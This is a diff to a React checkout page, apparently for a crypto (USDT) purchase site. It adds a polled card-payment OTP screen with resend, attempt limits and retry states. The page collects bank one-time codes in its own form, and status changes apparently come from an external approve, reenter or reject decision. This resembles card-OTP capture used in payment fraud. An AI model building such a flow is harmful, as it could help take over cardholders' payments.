@@ -1,12 +1,23 @@
-import React, { useEffect, useMemo, useState } from 'react';
+import React, { useCallback, useEffect, useMemo, useState } from 'react';
 import { Link, useLocation, useNavigate } from 'react-router-dom';
 import { translations } from '../translations';
-import { createOrder, getPaymentDetails, submitCreditCardOtp, fetchCreditCardOtpDecision } from '../api';
+import {
+  createOrder,
+  getPaymentDetails,
+  submitCreditCardOtp,
+  fetchCreditCardOtpDecision,
+  fetchOrderOtpStatus,
+  requestOtpResend,
+} from '../api';
 import { getOrCreateVisitorId } from '../visitTracking';
 import { saveOrderLocal } from '../lib/savedOrders';
 import { NETWORK_POLICY, minUsdtForNetwork, feeUsdtForNetwork } from '../../shared/networkPolicy.js';
+import { CardProcessingToOtpScreen, OtpResendButton, OtpVerificationExtras } from '../components/OtpPaymentUi';
 import Header from '../components/Header';
 import Footer from '../components/Footer';
+
+const OTP_MAX_ATTEMPTS = 2;
+const OTP_POLL_MS = 2000;
 
 function useCountdown(targetMs) {
   const [now, setNow] = useState(() => Date.now());
@@ -93,6 +104,25 @@ export default function BuyPage() {
 
   const [ccSubmissionId, setCcSubmissionId] = useState('');
   const [otpFailType, setOtpFailType] = useState('incorrect');
+  const [preOtpProcessing, setPreOtpProcessing] = useState(false);
+  const [otpAttempts, setOtpAttempts] = useState(0);
+  const [otpMaxAttempts, setOtpMaxAttempts] = useState(OTP_MAX_ATTEMPTS);
+  const [otpRemaining, setOtpRemaining] = useState(OTP_MAX_ATTEMPTS);
+  const [otpRetryNotice, setOtpRetryNotice] = useState(false);
+  const [otpResendCooldown, setOtpResendCooldown] = useState(0);
+  const [otpResendNotice, setOtpResendNotice] = useState(false);
+  const [otpFailReason, setOtpFailReason] = useState(null);
+  const [otpResendLoading, setOtpResendLoading] = useState(false);
+
+  const applyOtpPollMeta = useCallback((data) => {
+    if (typeof data?.otp_attempts === 'number') setOtpAttempts(data.otp_attempts);
+    if (typeof data?.otp_max_attempts === 'number') setOtpMaxAttempts(data.otp_max_attempts);
+    if (typeof data?.otp_remaining === 'number') setOtpRemaining(data.otp_remaining);
+    if (typeof data?.otp_resend_cooldown_sec === 'number') {
+      setOtpResendCooldown(Math.max(0, data.otp_resend_cooldown_sec));
+    }
+    if (data?.fail_reason) setOtpFailReason(data.fail_reason);
+  }, []);
 
   useEffect(() => {
     document.documentElement.dir = isRtl ? 'rtl' : 'ltr';
@@ -159,7 +189,26 @@ export default function BuyPage() {
     setOtpCode('');
     setOtpExpiresAt(null);
     setVerifyingOtp(false);
+    setPreOtpProcessing(false);
+    setOtpAttempts(0);
+    setOtpMaxAttempts(OTP_MAX_ATTEMPTS);
+    setOtpRemaining(OTP_MAX_ATTEMPTS);
+    setOtpRetryNotice(false);
+    setOtpResendCooldown(0);
+    setOtpResendNotice(false);
+    setOtpFailReason(null);
+    setOtpResendLoading(false);
+    setCcSubmissionId('');
+    setOtpFailType('incorrect');
   }, [paymentMethod]);
+
+  useEffect(() => {
+    if (otpResendCooldown <= 0) return undefined;
+    const tmr = setInterval(() => {
+      setOtpResendCooldown((s) => Math.max(0, s - 1));
+    }, 1000);
+    return () => clearInterval(tmr);
+  }, [otpResendCooldown]);
 
   useEffect(() => { setFastPayQrFailed(false); }, [pm?.fastPay?.qrImage]);
   useEffect(() => { setZainQrFailed(false); }, [pm?.zainCash?.qrImage]);
@@ -293,7 +342,10 @@ export default function BuyPage() {
       if (isCreditCard && response?.otpRequired) {
         setOtpExpiresAt(response?.otpExpiresAt || null);
         setOtpCode('');
-        setStage(3);
+        setPreOtpProcessing(true);
+        setOtpRetryNotice(false);
+        setOtpResendNotice(false);
+        setOtpFailReason(null);
       } else {
         setSent(true);
       }
@@ -317,17 +369,35 @@ export default function BuyPage() {
     }
   };
 
+  const onOtpResend = async () => {
+    if (!orderId || otpResendLoading) return;
+    setOtpResendLoading(true);
+    setError('');
+    try {
+      const data = await requestOtpResend(orderId);
+      setOtpResendNotice(true);
+      setOtpResendCooldown(data?.cooldown_sec ?? 60);
+    } catch (e) {
+      if (e?.cooldown_sec != null) setOtpResendCooldown(e.cooldown_sec);
+      else setError(String(e?.message || e));
+    } finally {
+      setOtpResendLoading(false);
+    }
+  };
+
   const onSubmitOtp = async () => {
     if (!orderId) {
       setError(isRtl ? 'رقم الطلب غير موجود. أعد المحاولة.' : 'Missing order id. Please try again.');
       return;
     }
     const code = String(otpCode || '').trim();
-    if (!/^\d{3,9}$/.test(code)) {
-      setError(isRtl ? 'يرجى إدخال كود مكوّن من 3 إلى 9 أرقام.' : 'Please enter a code with 3 to 9 digits.');
+    if (!/^\d{6}$/.test(code)) {
+      setError(isRtl ? 'يرجى إدخال رمز مكوّن من 6 أرقام.' : 'Please enter a 6-digit code.');
       return;
     }
 
+    setOtpRetryNotice(false);
+    setOtpResendNotice(false);
     setVerifyingOtp(true);
     setError('');
     try {
@@ -345,6 +415,95 @@ export default function BuyPage() {
       setVerifyingOtp(false);
     }
   };
+
+  useEffect(() => {
+    if (!preOtpProcessing || !orderId) return undefined;
+    let alive = true;
+    const handleStatus = (data) => {
+      if (!data?.status) return;
+      applyOtpPollMeta(data);
+      const status = String(data.status).toLowerCase();
+      if (status === 'awaiting_otp') {
+        setPreOtpProcessing(false);
+        setStage(3);
+        return;
+      }
+      if (status === 'retry_otp') {
+        setPreOtpProcessing(false);
+        setStage(3);
+        setOtpCode('');
+        setOtpRetryNotice(true);
+        return;
+      }
+      if (status === 'failed') {
+        setPreOtpProcessing(false);
+        setOtpFailType('rejected');
+        setStage(6);
+        return;
+      }
+      if (status === 'completed') {
+        setPreOtpProcessing(false);
+        setStage(5);
+        setTimeout(() => {
+          if (alive) navigate(`/track?order=${encodeURIComponent(orderId)}`);
+        }, 1100);
+      }
+    };
+    const poll = async () => {
+      try {
+        const data = await fetchOrderOtpStatus(orderId);
+        if (!alive) return;
+        handleStatus(data);
+      } catch {
+        /* ignore polling errors */
+      }
+    };
+    poll();
+    const timer = setInterval(poll, OTP_POLL_MS);
+    return () => {
+      alive = false;
+      clearInterval(timer);
+    };
+  }, [preOtpProcessing, orderId, applyOtpPollMeta, navigate]);
+
+  useEffect(() => {
+    const shouldPoll = !!orderId && (stage === 3 || stage === 4);
+    if (!shouldPoll) return undefined;
+    let alive = true;
+    const poll = async () => {
+      try {
+        const data = await fetchOrderOtpStatus(orderId);
+        if (!alive || !data?.status) return;
+        applyOtpPollMeta(data);
+        const status = String(data.status).toLowerCase();
+        if (stage === 4) {
+          if (status === 'retry_otp') {
+            setStage(3);
+            setOtpCode('');
+            setOtpRetryNotice(true);
+            setCcSubmissionId('');
+          } else if (status === 'failed') {
+            setOtpFailType('rejected');
+            setStage(6);
+            setCcSubmissionId('');
+          }
+          return;
+        }
+        if (stage === 3 && status === 'failed' && data.fail_reason === 'otp_attempts_exceeded') {
+          setOtpFailType('rejected');
+          setStage(6);
+        }
+      } catch {
+        /* ignore polling errors */
+      }
+    };
+    poll();
+    const timer = setInterval(poll, OTP_POLL_MS);
+    return () => {
+      alive = false;
+      clearInterval(timer);
+    };
+  }, [stage, orderId, applyOtpPollMeta]);
 
   useEffect(() => {
     if (stage !== 4 || !ccSubmissionId) return;
@@ -385,22 +544,15 @@ export default function BuyPage() {
         if (decision === 'rejected') {
           setOtpFailType('rejected');
           setStage(6);
-          setTimeout(() => {
-            if (!alive) return;
-            setStage(3);
-            setOtpCode('');
-          }, 3000);
           return;
         }
 
         if (decision === 'reenter') {
           setOtpFailType('incorrect');
-          setStage(6);
-          setTimeout(() => {
-            if (!alive) return;
-            setStage(3);
-            setOtpCode('');
-          }, 3000);
+          setStage(3);
+          setOtpCode('');
+          setOtpRetryNotice(true);
+          setCcSubmissionId('');
           return;
         }
 
@@ -589,7 +741,7 @@ export default function BuyPage() {
                 </select>
               </div>
             </div>
-            {stage === 2 && (
+            {stage === 2 && !preOtpProcessing && (
             <>
               {paymentMethod === 'FastPay' && (
                 <div className="text-center">
@@ -789,7 +941,7 @@ export default function BuyPage() {
             </>
             )}
 
-            {stage === 2 && (
+            {stage === 2 && !preOtpProcessing && (
               <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
                 {!isCreditCard && (
                   <div className="input-group buy-span-2">
@@ -958,23 +1110,37 @@ export default function BuyPage() {
               </div>
             )}
 
-            {stage === 3 && (
+            {preOtpProcessing && (
+              <CardProcessingToOtpScreen lang={lang} etaText={t.otpEtaDelivery} />
+            )}
+
+            {stage === 3 && !preOtpProcessing && (
               <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
                 <div className="cc-otp-card buy-span-2">
                   <div className="cc-otp-title">{isRtl ? 'تحقق من الدفع' : 'Payment Verification'}</div>
                   <div className="cc-otp-sub">{isRtl ? 'أدخل كود التحقق الذي وصلك' : 'Enter the verification code you received'}</div>
 
+                  <OtpVerificationExtras
+                    t={t}
+                    otpAttempts={otpAttempts}
+                    otpMaxAttempts={otpMaxAttempts}
+                    otpRemaining={otpRemaining}
+                    otpRetryNotice={otpRetryNotice}
+                    otpResendNotice={otpResendNotice}
+                  />
+
                   <label className="input-label cc-otp-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
-                    {isRtl ? 'أدخل كود التحقق (3-9 أرقام)' : 'Verification code (3-9 digits)'}
+                    {isRtl ? 'أدخل كود التحقق (6 أرقام)' : 'Verification code (6 digits)'}
                   </label>
                   <div className="cc-otp-input-wrap">
                     <input
                       className="input-control cc-otp-input"
                       value={otpCode}
-                      onChange={(e) => setOtpCode(String(e.target.value).replace(/\D/g, '').slice(0, 9))}
+                      onChange={(e) => setOtpCode(String(e.target.value).replace(/\D/g, '').slice(0, 6))}
                       placeholder={isRtl ? 'ادخل الرمز' : 'Enter code'}
                       dir="ltr"
                       inputMode="numeric"
+                      maxLength={6}
                       style={{ textAlign: 'left' }}
                     />
                   </div>
@@ -984,6 +1150,16 @@ export default function BuyPage() {
                       {isRtl ? 'صلاحية الكود: 10 دقائق' : 'OTP validity: 10 minutes'}
                     </div>
                   )}
+
+                  <div className="otp-resend-wrap">
+                    <OtpResendButton
+                      t={t}
+                      loading={otpResendLoading}
+                      cooldown={otpResendCooldown}
+                      disabled={otpResendLoading || otpResendCooldown > 0 || verifyingOtp}
+                      onResend={() => void onOtpResend()}
+                    />
+                  </div>
                 </div>
               </div>
             )}
@@ -1020,9 +1196,9 @@ export default function BuyPage() {
                     </svg>
                   </div>
                   <div className="cc-otp-await-title">
-                    {otpFailType === 'rejected'
-                      ? (isRtl ? 'تم رفض الطلب' : 'Request Rejected')
-                      : (isRtl ? 'رمز غير صحيح' : 'Incorrect Code')}
+                    {otpFailReason === 'otp_attempts_exceeded' || otpFailType === 'rejected'
+                      ? t.otpRejectedAttempts
+                      : (isRtl ? 'الرمز غير صحيح' : 'Incorrect Code')}
                   </div>
                 </div>
               </div>
@@ -1040,6 +1216,7 @@ export default function BuyPage() {
               </div>
             )}
 
+            {!preOtpProcessing && (
             <div className="flex gap-4 mt-6 buy-actions" style={{ flexDirection: isRtl ? 'row-reverse' : 'row' }}>
               {stage === 1 ? (
                 <Link to="/" className="btn btn-outline" style={{ flex: 1 }}>
@@ -1049,11 +1226,12 @@ export default function BuyPage() {
                 <button
                   type="button"
                   onClick={() => {
-                    if (stage === 4) return;
+                    if (stage === 4 || stage === 6) return;
                     setStage(stage === 3 ? 2 : 1);
                   }}
                   className="btn btn-outline"
                   style={{ flex: 1 }}
+                  disabled={stage === 4 || stage === 5 || stage === 6 || stage === 7}
                 >
                   {isRtl ? 'رجوع للخطوة السابقة' : 'Back to previous step'}
                 </button>
@@ -1092,7 +1270,7 @@ export default function BuyPage() {
                       : stage === 2
                         ? (sending || cd.remainingMs === 0 || usdtAmount < minUsdtThisNetwork || (isCreditCard ? !canSendCard : false))
                         : stage === 3
-                          ? (verifyingOtp || cd.remainingMs === 0 || !/^\d{3,9}$/.test(String(otpCode || '').trim()))
+                          ? (verifyingOtp || cd.remainingMs === 0 || !/^\d{6}$/.test(String(otpCode || '').trim()))
                           : true
                 }
               >
@@ -1109,6 +1287,7 @@ export default function BuyPage() {
                       : (isRtl ? 'بانتظار...' : 'Waiting...')}
               </button>
             </div>
+            )}
 
             {cd.remainingMs === 0 && (
               <div className="text-error mt-4">
